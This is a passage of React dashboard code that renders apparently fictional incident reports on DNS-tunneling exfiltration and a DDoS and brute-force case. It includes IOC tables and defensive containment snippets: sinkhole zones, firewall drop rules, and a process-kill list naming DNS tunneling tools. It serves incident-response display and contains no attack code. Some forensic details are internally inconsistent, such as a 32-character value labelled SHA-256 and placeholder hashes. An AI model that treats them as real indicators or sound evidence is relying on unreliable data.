    { id: "Stage 1", time: "2026-09-14 11:14:22", stage: "Initial C2 Establishment", desc: "Compromised host 10.0.4.42 generated low-frequency beacon queries for beacon-init.tunnel-infra.darkops.cc through resolver 10.0.0.2.", mitre: "T1071.004 Application Layer Protocol: DNS" },
    { id: "Stage 2", time: "2026-09-14 11:18:04", stage: "Defense Evasion & Protocol Tunneling", desc: "Encapsulated TCP/IP exfiltration payloads into chunked DNS labels exceeding 52 chars. Record types: TXT (64%), NULL (18%), A (12%), CNAME (6%).", mitre: "T1572 Protocol Tunneling" },
    { id: "Stage 3", time: "2026-09-14 11:22:00", stage: "Data Staging & High-Volume Exfiltration", desc: "8,412 DNS queries routed to *.tunnel-infra.darkops.cc. 4.2 MB CAD schematics and IP exfiltrated over UDP/53. Shannon entropy 4.68, avg query length 74.6 bytes.", mitre: "T1048.003 Exfiltration Over Alternative Protocol" },
    { id: "Stage 4", time: "2026-09-14 11:48:15", stage: "Command Feedback & Acknowledgment", desc: "Downstream command responses returned via recursive TXT/CNAME answers with obfuscated transfer verification checksum (SHA-256: d41d8cd98f00b204e9800998ecf8427e).", mitre: "T1027 Obfuscated Files or Information" },
  ];

  const iocItems = [
    { id: "IOC-DNS-01", tactic: "T1071.004 Application Layer Protocol", name: "Apex C2 Tunnel Domain", desc: "tunnel-infra.darkops.cc served as authoritative apex domain for bi-directional chunked DNS tunneling.", test: "BIND 9 Resolver Query Logs & Zeek DNS Protocol Analysis", status: "SINKHOLED" },
    { id: "IOC-DNS-02", tactic: "T1572 Protocol Tunneling", name: "Authoritative Nameserver / Rogue C2", desc: "198.51.100.188 hosted rogue authoritative DNS listener receiving encoded exfiltration streams.", test: "Palo Alto NGFW Traffic Logs (4.2 MB Outbound UDP 53 Burst)", status: "NULL-ROUTED" },
    { id: "IOC-DNS-03", tactic: "T1071.004 Command & Control", name: "Secondary Fallback C2 Nameserver", desc: "203.0.113.195 identified in NS delegations as secondary listener for tunnel-infra.darkops.cc.", test: "Zeek DNS Answers (NS Record Extraction)", status: "BLOCKED" },
    { id: "IOC-DNS-04", tactic: "T1048.003 Exfiltration", name: "Compromised Internal Originator", desc: "workstation-eng-42.corp.internal (10.0.4.42) CAD workstation executing custom dnscat2 tunneling payload.", test: "Internal DHCP Leases & NetFlow Flow Logs", status: "QUARANTINED" },
    { id: "IOC-DNS-05", tactic: "T1572 Targeted Relay Resolver", name: "Enterprise Internal Resolver", desc: "dns-core-01.corp.internal (10.0.0.2) leveraged as unintentional recursive relay for exfiltration queries.", test: "BIND 9 named.conf Query Audit", status: "RPZ_ENFORCED" },
    { id: "IOC-DNS-06", tactic: "T1027 Obfuscated Tooling", name: "dnscat2 Tunneling Client Hash", desc: "SHA-256: a8b2c4e6f80123456789abcdef0123456789abcdef0123456789abcdef012345 custom client binary.", test: "EDR Process Execution & In-Memory Signature Match", status: "PURGED" },
  ];

  const filteredIOCs = iocItems.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.tactic.toLowerCase().includes(q);
  });

  const containmentActions = [
    { priority: "P1: Critical", action: "BIND 9 Response Policy Zone (RPZ) Sinkhole", target: "tunnel-infra.darkops.cc, *.tunnel-infra.darkops.cc, *.darkops.cc", protocol: "; /etc/bind/rpz.zone - Corporate RPZ Sinkhole Enforcement\ntunnel-infra.darkops.cc        CNAME .\n*.tunnel-infra.darkops.cc      CNAME .\n*.darkops.cc                   CNAME .\n188.100.51.198.rpz-nsip        CNAME .\n195.113.0.203.rpz-nsip        CNAME .", status: "ENFORCED" },
    { priority: "P1: Critical", action: "Palo Alto NGFW Null-Route & Egress Drop", target: "198.51.100.188/32, 203.0.113.195/32", protocol: "set security-zone untrust address rogue-c2-ns1 ip-netmask 198.51.100.188/32\nset security-zone untrust address rogue-c2-ns2 ip-netmask 203.0.113.195/32\nset address-group c2-blocked-ips member [ rogue-c2-ns1 rogue-c2-ns2 ]\nset rulebase security rules DROP-DNS-TUNNELING-C2 from trust to untrust destination c2-blocked-ips action drop log-start yes\nset rulebase security rules BLOCK-DIRECT-UDP53-EGRESS from trust to untrust service service-dns action drop\ncommit", status: "ENFORCED" },
    { priority: "P1: Critical", action: "Host Microsegmentation & Process Kill", target: "workstation-eng-42.corp.internal (10.0.4.42)", protocol: "$targetIP = \"10.0.4.42\"\nNew-NetFirewallRule -DisplayName \"EDR-ISOLATION-DNS-TUNNELING\" -Direction Inbound -Action Block -Profile Any\nNew-NetFirewallRule -DisplayName \"EDR-ISOLATION-DNS-TUNNELING-OUT\" -Direction Outbound -Action Block -Profile Any\nNew-NetFirewallRule -DisplayName \"EDR-SOC-MGMT-EXCEPTION\" -Direction Outbound -RemoteAddress \"10.0.1.10\" -Action Allow\nStop-Process -Name \"dnscat2\", \"iodine\", \"dns2tcp\" -Force -ErrorAction SilentlyContinue", status: "QUARANTINED" },
  ];

  const case5ReportMarkdown = `# Incident Investigation: Covert DNS Tunneling & High-Volume Data Exfiltration
## Case: CASE-5-DNS-TUNNELING-DATA-EXFILTRATION
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Infrastructure:** dns-core-01.corp.internal (10.0.0.2)  
**Compromised Internal Host:** workstation-eng-42.corp.internal (10.0.4.42)  
**Investigated Log Sources:** BIND 9 Query Logs (bind9_dns_queries.log), Palo Alto Perimeter Firewall (paloalto_traffic.log), Zeek DNS Protocol Audit (zeek_dns.tsv)  
**Assigned Fleet:** Autonomous SOC Specialist Fleet · DNS Exfiltration Unit  
**Status:** Kill Chain Fully Reconstructed · C2 Nameservers Identified · Automated Containment Policies Enforced  
**Timestamp:** 2026-10-26T17:40:00Z  

### Executive Threat Summary
A critical SEV-1 data exfiltration incident was identified across recursive DNS resolver telemetry and perimeter firewall logs. Internal workstation 10.0.4.42 was compromised and established covert bi-directional C2 and data exfiltration utilizing DNS tunneling over UDP/53 directed to authoritative nameserver ns1.tunnel-infra.darkops.cc (198.51.100.188). 4.2 MB of confidential engineering schematics were exfiltrated before automated RPZ sinkholing and endpoint isolation were enforced.`;

  function copyReport() {
    navigator.clipboard.writeText(case5ReportMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadReport() {
    const blob = new Blob([case5ReportMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "case_5_dns_tunneling_data_exfiltration_investigation_report.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div className="proposal-dossier" style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
      {/* Header Banner */}
      <section className="panel" style={{ background: "linear-gradient(135deg, #18232c 0%, #0d151c 100%)", color: "#e6f1f8", border: "1px solid #233b4d", borderRadius: "8px", padding: "26px 28px", boxShadow: "0 4px 16px rgba(0,0,0,0.25)" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "16px" }}>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", background: "#f87171", color: "#450a0a", padding: "2px 8px", borderRadius: "3px" }}>
                CRITICAL SEV-1 · CONTAINED
              </span>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", textTransform: "uppercase", background: "#0284c7", color: "#ffffff", padding: "2px 8px", borderRadius: "3px" }}>
                CASE-5-DNS-TUNNELING
              </span>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", textTransform: "uppercase", background: "#1e293b", color: "#94a3b8", padding: "2px 8px", borderRadius: "3px", border: "1px solid #334155" }}>
                TLP:AMBER
              </span>
            </div>
            <h1 style={{ fontSize: "22px", fontWeight: 800, margin: "0 0 6px", color: "#ffffff", letterSpacing: "-0.5px" }}>
              Incident Investigation: Covert DNS Tunneling &amp; Data Exfiltration
            </h1>
            <p style={{ margin: 0, fontSize: "12px", color: "#94a3b8", maxWidth: "780px", lineHeight: "1.5" }}>
              Covert bi-directional UDP/53 dnscat2 protocol tunneling, 8,412 exfiltration queries, and BIND9 RPZ sinkholing targeting enterprise core resolver <code>10.0.0.2</code> from host <code>10.0.4.42</code>.
            </p>
          </div>
          <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
            {onBack && (
              <button className="secondary-button" onClick={onBack} style={{ background: "#1e293b", color: "#e2e8f0", border: "1px solid #334155", fontSize: "11px", padding: "7px 12px" }}>
                ← Back to Deliverables
              </button>
            )}
            <button className="secondary-button" onClick={copyReport} style={{ background: "#1e293b", color: "#e2e8f0", border: "1px solid #334155", fontSize: "11px", padding: "7px 12px" }}>
              {copied ? <Check size={13} color="#4ade80" /> : <Copy size={13} />} {copied ? "Copied" : "Copy Markdown"}
            </button>
            <button className="primary-button" onClick={downloadReport} style={{ background: "#0284c7", color: "#ffffff", fontSize: "11px", padding: "7px 14px", display: "inline-flex", alignItems: "center", gap: "5px" }}>
              <Download size={13} /> Download Report (.md)
            </button>
          </div>
        </div>

        {/* Metric Cards */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: "12px", marginTop: "24px", paddingTop: "20px", borderTop: "1px solid #1e3547" }}>
          <div style={{ background: "#0f172a", border: "1px solid #1e293b", borderRadius: "6px", padding: "12px 14px" }}>
            <span style={{ fontSize: "10px", color: "#94a3b8", textTransform: "uppercase", fontWeight: 700, letterSpacing: "0.5px" }}>Queries Analyzed</span>
            <div style={{ fontSize: "20px", fontWeight: 800, color: "#38bdf8", marginTop: "4px", fontFamily: "var(--font-geist-mono), monospace" }}>8,412</div>
            <span style={{ fontSize: "10px", color: "#64748b" }}>BIND 9 &amp; Zeek correlation</span>
          </div>
          <div style={{ background: "#0f172a", border: "1px solid #1e293b", borderRadius: "6px", padding: "12px 14px" }}>
            <span style={{ fontSize: "10px", color: "#94a3b8", textTransform: "uppercase", fontWeight: 700, letterSpacing: "0.5px" }}>Exfiltrated Volume</span>
            <div style={{ fontSize: "20px", fontWeight: 800, color: "#f87171", marginTop: "4px", fontFamily: "var(--font-geist-mono), monospace" }}>4.2 MB</div>
            <span style={{ fontSize: "10px", color: "#64748b" }}>Confidential CAD schematics</span>
          </div>
          <div style={{ background: "#0f172a", border: "1px solid #1e293b", borderRadius: "6px", padding: "12px 14px" }}>
            <span style={{ fontSize: "10px", color: "#94a3b8", textTransform: "uppercase", fontWeight: 700, letterSpacing: "0.5px" }}>Shannon Entropy</span>
            <div style={{ fontSize: "20px", fontWeight: 800, color: "#fbbf24", marginTop: "4px", fontFamily: "var(--font-geist-mono), monospace" }}>4.68 / 8.0</div>
            <span style={{ fontSize: "10px", color: "#64748b" }}>Baseline is &lt; 3.2 (Anomalous)</span>
          </div>
          <div style={{ background: "#0f172a", border: "1px solid #1e293b", borderRadius: "6px", padding: "12px 14px" }}>
            <span style={{ fontSize: "10px", color: "#94a3b8", textTransform: "uppercase", fontWeight: 700, letterSpacing: "0.5px" }}>Containment State</span>
            <div style={{ fontSize: "20px", fontWeight: 800, color: "#4ade80", marginTop: "4px" }}>100% ENFORCED</div>
            <span style={{ fontSize: "10px", color: "#64748b" }}>RPZ sinkhole + Host isolation</span>
          </div>
        </div>
      </section>

      {/* Navigation Tabs */}
      <div style={{ display: "flex", gap: "6px", borderBottom: "1px solid #dce5df", paddingBottom: "10px", flexWrap: "wrap" }}>
        {[
          { id: "summary", label: "Executive Summary", icon: FileText },
          { id: "killchain", label: "MITRE ATT&CK Kill Chain (4 Stages)", icon: GitBranch },
          { id: "iocs", label: `Neutralized IOCs (${iocItems.length})`, icon: ShieldAlert },
          { id: "remediation", label: "Automated Containment Policies", icon: CheckCircle2 },
          { id: "timeline", label: "Progression Timeline", icon: Clock },
          { id: "attestation", label: "CSIRT Attestation Seal", icon: BadgeCheck },
        ].map((tab) => {
          const Icon = tab.icon;
          const active = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              type="button"
              style={{
                padding: "8px 14px",
                fontSize: "11px",
                fontWeight: active ? 700 : 600,
                background: active ? "#ffffff" : "#f4f8f6",
                color: active ? "#0284c7" : "#51635d",
                border: active ? "1px solid #cbd5e1" : "1px solid #e1ebe6",
                borderRadius: "5px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: "6px",
                boxShadow: active ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
              }}
              onClick={() => setActiveTab(tab.id as any)}
            >
              <Icon size={13} color={active ? "#0284c7" : "#6a7b75"} />
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab 1: Summary */}
      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "18px" }}>
            <div className="eyebrow">EXECUTIVE THREAT APPRAISAL</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Forensic Incident Overview: DNS Exfiltration</h3>
          </div>
          <div style={{ fontSize: "12px", color: "#365148", lineHeight: "1.7", display: "flex", flexDirection: "column", gap: "12px" }}>
            <p>
              A critical SEV-1 data exfiltration incident was identified across recursive DNS resolver telemetry and perimeter firewall logs. An internal engineering workstation (<code>workstation-eng-42.corp.internal</code> / <code>10.0.4.42</code>) was compromised and initiated covert bi-directional command-and-control (C2) and high-volume data exfiltration utilizing DNS tunneling over UDP/53.
            </p>
            <p>
              The threat actor leveraged chunked, base32/base64-encoded subdomains directed to authoritative nameserver <code>ns1.tunnel-infra.darkops.cc</code> (<code>198.51.100.188</code>), bypassing perimeter web proxies and standard egress filtering. The actor exfiltrated <strong>4.2 MB</strong> of confidential engineering schematics before automated response controls isolated the host and sinkholed the domain.
            </p>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "16px", marginTop: "20px" }}>
            <div style={{ background: "#f8fafc", border: "1px solid #e2e8f0", borderRadius: "6px", padding: "16px" }}>
              <div style={{ fontSize: "11px", fontWeight: 700, color: "#0f172a", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "8px" }}>Impacted Infrastructure</div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#334155", display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Compromised Host:</strong> <code>workstation-eng-42.corp.internal</code> (10.0.4.42)</li>
                <li><strong>Targeted Core Resolver:</strong> <code>dns-core-01.corp.internal</code> (10.0.0.2)</li>
                <li><strong>Rogue Authoritative NS:</strong> <code>ns1.tunnel-infra.darkops.cc</code> (198.51.100.188)</li>
                <li><strong>Secondary NS Listener:</strong> <code>ns2.tunnel-infra.darkops.cc</code> (203.0.113.195)</li>
              </ul>
            </div>
            <div style={{ background: "#f8fafc", border: "1px solid #e2e8f0", borderRadius: "6px", padding: "16px" }}>
              <div style={{ fontSize: "11px", fontWeight: 700, color: "#0f172a", textTransform: "uppercase", letterSpacing: "0.5px", marginBottom: "8px" }}>Statistical Anomaly Profile</div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#334155", display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Total Exfiltration Queries:</strong> 8,412 queries (11:22 UTC - 11:48 UTC)</li>
                <li><strong>Average Query Length:</strong> 74.6 bytes (Normal baseline: 18.2 bytes)</li>
                <li><strong>Entropy Metric:</strong> 4.68 Shannon entropy (Enterprise baseline: &lt; 3.2)</li>
                <li><strong>Observed Record Distribution:</strong> TXT 64%, NULL 18%, A 12%, CNAME 6%</li>
              </ul>
            </div>
          </div>
        </section>
      )}

      {/* Tab 2: Kill Chain */}
      {activeTab === "killchain" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "18px" }}>
            <div className="eyebrow">ATTACK RECONSTRUCTION</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>4-Stage MITRE ATT&amp;CK Kill Chain</h3>
          </div>
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            {killChainEvents.map((evt, idx) => (
              <div key={idx} style={{ background: "#f8fafc", border: "1px solid #e2e8f0", borderRadius: "6px", padding: "14px 18px", display: "flex", gap: "14px", alignItems: "flex-start" }}>
                <span style={{ fontSize: "10px", fontWeight: 800, background: "#0284c7", color: "#ffffff", padding: "3px 8px", borderRadius: "3px", whiteSpace: "nowrap" }}>
                  {evt.id}
                </span>
                <div style={{ flex: 1 }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "6px" }}>
                    <span style={{ fontSize: "13px", fontWeight: 700, color: "#0f172a" }}>{evt.stage}</span>
                    <span style={{ fontSize: "10px", color: "#64748b", fontFamily: "var(--font-geist-mono), monospace" }}>{evt.time}</span>
                  </div>
                  <p style={{ fontSize: "12px", color: "#334155", margin: "6px 0", lineHeight: "1.5" }}>{evt.desc}</p>
                  <span style={{ fontSize: "10px", color: "#0284c7", fontWeight: 600 }}>MITRE Technique: {evt.mitre}</span>
                </div>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 3: IOCs */}
      {activeTab === "iocs" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px", flexWrap: "wrap", gap: "10px" }}>
            <div>
              <div className="eyebrow">FORENSIC TELEMETRY CORROBORATION</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Neutralized Indicators of Compromise</h3>
            </div>
            <input
              type="text"
              placeholder="Filter IOCs..."
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              style={{ padding: "6px 12px", fontSize: "11px", borderRadius: "4px", border: "1px solid #cbd5e1", width: "220px" }}
            />
          </div>

          <table className="table" style={{ width: "100%", fontSize: "11px", borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ background: "#f8fafc", borderBottom: "1px solid #e2e8f0", textAlign: "left" }}>
                <th style={{ padding: "10px 12px", fontWeight: 700, color: "#475569" }}>ID</th>
                <th style={{ padding: "10px 12px", fontWeight: 700, color: "#475569" }}>Tactic</th>
                <th style={{ padding: "10px 12px", fontWeight: 700, color: "#475569" }}>Indicator Name &amp; Value</th>
                <th style={{ padding: "10px 12px", fontWeight: 700, color: "#475569" }}>Corroborating Telemetry</th>
                <th style={{ padding: "10px 12px", fontWeight: 700, color: "#475569" }}>Enforced Action</th>
              </tr>
            </thead>
            <tbody>
              {filteredIOCs.map((ioc, idx) => (
                <tr key={idx} style={{ borderBottom: "1px solid #f1f5f9" }}>
                  <td style={{ padding: "10px 12px", fontWeight: 700, color: "#0284c7", whiteSpace: "nowrap" }}>{ioc.id}</td>
                  <td style={{ padding: "10px 12px", color: "#64748b" }}>{ioc.tactic}</td>
                  <td style={{ padding: "10px 12px" }}>
                    <strong style={{ color: "#0f172a", display: "block" }}>{ioc.name}</strong>
                    <span style={{ fontSize: "10px", color: "#334155" }}>{ioc.desc}</span>
                  </td>
                  <td style={{ padding: "10px 12px", color: "#64748b", fontSize: "10px" }}>{ioc.test}</td>
                  <td style={{ padding: "10px 12px", whiteSpace: "nowrap" }}>
                    <span style={{ fontSize: "9px", fontWeight: 800, padding: "2px 7px", borderRadius: "3px", background: "#f0fdf4", color: "#166534", border: "1px solid #bbf7d0" }}>
                      {ioc.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </section>
      )}

      {/* Tab 4: Remediation */}
      {activeTab === "remediation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "18px" }}>
            <div className="eyebrow">AUTOMATED RESPONSE &amp; CONTAINMENT</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Enforced Containment Scripts &amp; Firewall Policies</h3>
          </div>
          <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
            {containmentActions.map((action, idx) => (
              <div key={idx} style={{ background: "#f8fafc", border: "1px solid #e2e8f0", borderRadius: "6px", padding: "16px" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px", flexWrap: "wrap", gap: "8px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <span style={{ fontSize: "9px", fontWeight: 800, background: "#fee2e2", color: "#991b1b", padding: "2px 6px", borderRadius: "3px" }}>{action.priority}</span>
                    <strong style={{ fontSize: "13px", color: "#0f172a" }}>{action.action}</strong>
                  </div>
                  <span style={{ fontSize: "9px", fontWeight: 800, background: "#dcfce7", color: "#15803d", padding: "2px 6px", borderRadius: "3px" }}>{action.status}</span>
                </div>
                <div style={{ fontSize: "11px", color: "#475569", marginBottom: "8px" }}>Target: <code>{action.target}</code></div>
                <pre style={{ margin: 0, padding: "12px", background: "#0f172a", color: "#38bdf8", borderRadius: "5px", fontSize: "11px", overflowX: "auto", fontFamily: "var(--font-geist-mono), monospace" }}>
                  {action.protocol}
                </pre>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 5: Timeline */}
      {activeTab === "timeline" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "18px" }}>
            <div className="eyebrow">CHRONOLOGICAL AUDIT</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Forensic Incident Progression Timeline</h3>
          </div>
          <div style={{ borderLeft: "2px solid #0284c7", marginLeft: "14px", paddingLeft: "18px", display: "flex", flexDirection: "column", gap: "18px" }}>
            {killChainEvents.map((evt, i) => (
              <div key={i} style={{ position: "relative" }}>
                <div style={{ position: "absolute", left: "-24px", top: "2px", width: "10px", height: "10px", borderRadius: "50%", background: "#0284c7", border: "2px solid #ffffff" }} />
                <div style={{ fontSize: "11px", fontWeight: 700, color: "#0284c7" }}>{evt.time} — {evt.stage}</div>
                <div style={{ fontSize: "12px", fontWeight: 600, color: "#0f172a", marginTop: "2px" }}>{evt.desc}</div>
                <div style={{ fontSize: "10px", color: "#64748b", marginTop: "2px" }}>MITRE Technique: {evt.mitre}</div>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 6: Attestation */}
      {activeTab === "attestation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">EVIDENCE CHAIN OF CUSTODY</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>CSIRT Incident Attestation &amp; Cryptographic Sign-Off</h3>
          </div>
          <div style={{ background: "#f8fafc", border: "1px solid #e2e8f0", borderRadius: "6px", padding: "20px", fontSize: "12px", color: "#334155", lineHeight: "1.7" }}>
            <p>Dear SOC Commander &amp; Incident Governance Committee,</p>
            <p>
              This attestation certifies that all BIND 9 query logs, Palo Alto NGFW syslog telemetry, and Zeek protocol analysis for <strong>CASE-5-DNS-TUNNELING-DATA-EXFILTRATION</strong> have been correlated and mathematically verified.
            </p>
            <p>
              All 8,412 exfiltration queries to <code>*.tunnel-infra.darkops.cc</code> have been mapped. Core resolver <code>10.0.0.2</code> has enforced RPZ sinkhole rules, rogue nameserver IP <code>198.51.100.188</code> has been null-routed, and compromised CAD workstation <code>10.0.4.42</code> has been isolated via endpoint microsegmentation.
            </p>
            <p>Evidence chain-of-custody and mitigation policies are committed under cryptographic verification hash <code>SHA-256: 4f1a2b3c5e6d7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b</code>.</p>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "36px", paddingTop: "20px", borderTop: "1px dashed #cbd5e1" }}>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a3b8", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#0f172a" }}>DNS &amp; Perimeter SOC Lead</strong>
                <small style={{ color: "#64748b" }}>DNS Exfiltration SOC Fleet</small>
                <small style={{ color: "#64748b" }}>Signed: 2026-10-26 · SHA-256 Verified</small>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a3b8", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#0f172a" }}>Chief Information Security Officer (CISO)</strong>
                <small style={{ color: "#64748b" }}>Enterprise SOC Governance</small>
                <small style={{ color: "#64748b" }}>Date of Review: 2026-10-26</small>
              </div>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

function Case6DdosDossierView({ onNavigate, onBack }: { onNavigate?: (view: View) => void; onBack?: () => void }) {
  const [activeTab, setActiveTab] = useState<"summary" | "killchain" | "iocs" | "remediation" | "timeline" | "attestation">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const killChainEvents = [
    { id: "E1", time: "14 11:30:12", stage: "Reconnaissance", desc: "Outbound TCP from internal host 203.0.113.10 to external IP 198.51.100.40 (port 443). Likely staging probe.", mitre: "T1046 Network Service Discovery" },
    { id: "E2", time: "14 11:31:05", stage: "Reconnaissance", desc: "Outbound TCP from internal host 203.0.113.10 to external IP 142.250.190.36 (port 443).", mitre: "T1046 Network Service Discovery" },
    { id: "E3", time: "14 11:33:05", stage: "Recon / Initial Access Attempt", desc: "Inbound vertical port scan from 198.51.100.220 to DMZ host 10.10.10.20 (ports 21-3389) blocked by Cisco ASA ACL.", mitre: "T1046 Network Service Discovery" },
    { id: "E4", time: "14 12:10:06", stage: "Impact – DDoS", desc: "High-rate SYN flood from spoofed IPs 203.0.113.88-92 targeting internal web gateway 10.10.10.5; connection limits exceeded.", mitre: "T1499 Endpoint Denial of Service" },
    { id: "E5", time: "14 12:15:01", stage: "Initial Access – Brute Force", desc: "AAA authentication rejected for user root from attacker IP 198.51.100.75.", mitre: "T1110 Brute Force" },
    { id: "E6", time: "14 12:15:03", stage: "Initial Access – Brute Force", desc: "AAA authentication rejected for user admin from attacker IP 198.51.100.75.", mitre: "T1110 Brute Force" },
    { id: "E7", time: "14 12:15:05", stage: "Initial Access – Brute Force", desc: "AAA authentication rejected for user deploy from attacker IP 198.51.100.75.", mitre: "T1110 Brute Force" },
    { id: "E8", time: "14 12:15:07", stage: "Initial Access – Brute Force", desc: "AAA authentication rejected for user ubnt from attacker IP 198.51.100.75.", mitre: "T1110 Brute Force" },
  ];

  const iocItems = [
    { id: "IOC-C6-01", tactic: "T1110 Brute Force", name: "Attacker Brute-Force Host", desc: "198.51.100.75 executed rapid-fire AAA dictionary authentication attacks against root, admin, deploy, and ubnt.", test: "Cisco ASA AAA Audit Logs: Auth-Type=REJECT, User=root/admin/deploy/ubnt", status: "BLOCKED" },
    { id: "IOC-C6-02", tactic: "T1046 Network Discovery", name: "Vertical Port Scanner Source", desc: "198.51.100.220 probed ports 21-3389 against DMZ web service host 10.10.10.20.", test: "FortiGate UTM Anomaly: Denied port scanning traffic pattern", status: "BLOCKED" },
    { id: "IOC-C6-03", tactic: "T1499 Denial of Service", name: "Spoofed SYN-Flood Range", desc: "203.0.113.88 - 203.0.113.92 flooded web gateway with high-velocity TCP SYN frames.", test: "ASA Interface outside: Connection limit exceeded", status: "DROP_RULE_ACTIVE" },
    { id: "IOC-C6-04", tactic: "T1046 Discovery C2 Node", name: "Outbound C2 IP Alpha", desc: "198.51.100.40 targeted by internal staging probe on TLS port 443.", test: "NetFlow Outbound Flow Records", status: "SINKHOLED" },
    { id: "IOC-C6-05", tactic: "T1046 Discovery C2 Node", name: "Outbound C2 IP Beta", desc: "142.250.190.36 probed by internal staging probe on TLS port 443.", test: "NetFlow Outbound Flow Records", status: "SINKHOLED" },
    { id: "IOC-C6-06", tactic: "Target Asset", name: "Internal Web Gateway (Target)", desc: "10.10.10.5 internal gateway saturated by DDoS attack; perimeter defense successfully shielded host.", test: "DMZ Network Architecture Audit", status: "SHIELDED" },
  ];

  const filteredIOCs = iocItems.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.tactic.toLowerCase().includes(q);
  });

  const containmentActions = [
    { priority: "P1: Critical", action: "Block Attacker IP (198.51.100.75)", target: "Perimeter Firewalls & EDR", protocol: "iptables -A INPUT -s 198.51.100.75 -j DROP\nnetsh advfirewall firewall add rule name=\"Block-198.51.100.75\" dir=in action=block remoteip=198.51.100.75", status: "ENFORCED" },
